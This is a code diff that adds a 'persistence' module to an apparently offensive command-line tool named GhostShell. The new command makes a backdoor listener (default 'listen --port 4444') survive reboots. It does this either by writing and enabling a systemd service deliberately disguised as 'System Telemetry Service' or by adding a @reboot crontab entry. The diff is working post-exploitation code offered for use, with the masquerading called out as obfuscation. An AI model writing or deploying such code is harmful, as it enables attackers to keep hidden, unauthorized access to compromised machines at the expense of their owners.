@@ -441,5 +441,81 @@ def sniff(
     except KeyboardInterrupt:
         console.print("\n[yellow]Sniffer stopped.[/yellow]")
 
+# --- MODULE 8: PERSISTENCE (Maintaining Access) ---
+
+@app.command()
+def persist(
+    method: str = typer.Option("systemd", help="Persistence method: 'systemd' or 'cron'"),
+    payload: str = typer.Option("listen --port 4444", help="Command to run on startup")
+):
+    """
+    [PERSISTENCE] Automatic Startup.
+    
+    Ensures GhostShell starts automatically after a system reboot.
+    Under the hood:
+    - Systemd: Creates a background daemon service in /etc/systemd/system/.
+    - Cron: Adds a @reboot entry to the crontab.
+    """
+    script_path = os.path.abspath(sys.argv[0])
+    python_path = sys.executable
+    full_cmd = f"{python_path} {script_path} {payload}"
+    
+    console.print(Panel(f"Method: {method}\nPayload: {payload}", title="Persistence Engine", style="bold green"))
+
+    if method == "systemd":
+        service_content = f"""[Unit]
+Description=System Telemetry Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={full_cmd}
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target
+"""
+        service_path = "/etc/systemd/system/ghostshell.service"
+        try:
+            with open(service_path, "w") as f:
+                f.write(service_content)
+            
+            # Reload systemd and enable
+            os.system("systemctl daemon-reload")
+            os.system("systemctl enable ghostshell.service")
+            console.print(f"[green]✔[/green] Systemd service created at {service_path}")
+            console.print("[dim]Service obfuscated as 'System Telemetry Service'[/dim]")
+        except Exception as e:
+            console.print(f"[red]Error creating Systemd service: {e}[/red]")
+            console.print("[yellow]Note: Root privileges and systemd are required.[/yellow]")
+
+    elif method == "cron":
+        cron_entry = f"@reboot {full_cmd}\n"
+        try:
+            # Check if entry already exists to avoid duplicates
+            current_cron = execute_command("crontab -l").decode().strip()
+            
+            # Fix: If 'crontab -l' returns error message, treat as empty
+            if "no crontab" in current_cron or "command not found" in current_cron:
+                current_cron = ""
+            
+            # Ensure newline between existing content and new entry
+            if current_cron and not current_cron.endswith("\n"):
+                current_cron += "\n"
+
+            if full_cmd in current_cron:
+                console.print("[yellow]Persistence already exists in Crontab.[/yellow]")
+            else:
+                with open("/tmp/cron_temp", "w") as f:
+                    f.write(current_cron + cron_entry)
+                
+                # Execute crontab update
+                os.system("crontab /tmp/cron_temp")
+                os.remove("/tmp/cron_temp")
+                console.print(f"[green]✔[/green] Added @reboot entry to Crontab")
+        except Exception as e:
+            console.print(f"[red]Error updating Crontab: {e}[/red]")
+
 if __name__ == "__main__":
     app()
